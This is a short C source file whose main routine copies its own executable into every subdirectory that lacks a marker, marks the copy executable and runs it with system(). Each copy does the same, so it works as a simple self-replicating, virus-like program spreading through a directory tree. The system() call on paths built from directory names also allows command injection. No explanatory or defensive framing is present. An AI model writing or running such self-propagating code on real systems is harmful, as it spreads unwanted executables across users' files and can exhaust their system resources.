#include "../include/main.h"

int main (int argc, char **argv) {
	char *program_name = NULL;
	char *dir_name = NULL;
	char *program_fullpath = NULL;
	char *dest_file = NULL;
	char src_fullpath[MAX];
	char dest_fullpath[MAX];
	Directory *list = NULL;
	Directory *it = NULL;

	// init
	program_name = basename(argv[0]);
	dir_name = dirname(argv[0]);
	realpath(dir_name, src_fullpath);
	program_fullpath = (char *) malloc(strlen(src_fullpath) + strlen(program_name) + 2);
	strcpy(program_fullpath, src_fullpath);
	strcat(program_fullpath, "/");
	strcat(program_fullpath, program_name);
	
	// list directories	
	list = (Directory *) malloc(sizeof(Directory));
	listDirectories(list, dir_name);
	it = list;
	while (it != NULL && it->directory != NULL) {
		dest_file = (char *) malloc(strlen(dir_name) + strlen(it->directory) + strlen (program_name) + 3);
		strcpy(dest_file, dir_name);
		strcat(dest_file, "/");
		strcat(dest_file, it->directory);
		strcat(dest_file, "/");
		realpath(dest_file, dest_fullpath);
		free(dest_file);
		dest_file = (char *) malloc(strlen(dest_fullpath) + strlen(program_name) + 2);
		strcpy(dest_file, dest_fullpath);
		strcat(dest_file, "/");
		strcat(dest_file, program_name);
		
		// if no marker in the destination directory, copy and exec program
		if (checkMarker(dest_fullpath) == -1) {
			copy(program_fullpath, dest_file);
			setExecutable(dest_file);
			system(dest_file);
		}

		memset(dest_fullpath, 0, MAX);
		free(dest_file);
		it = it->next;
	}

	// free dynamic allocation elements
	freeList(list);
	free(program_fullpath);

	return 0;
}
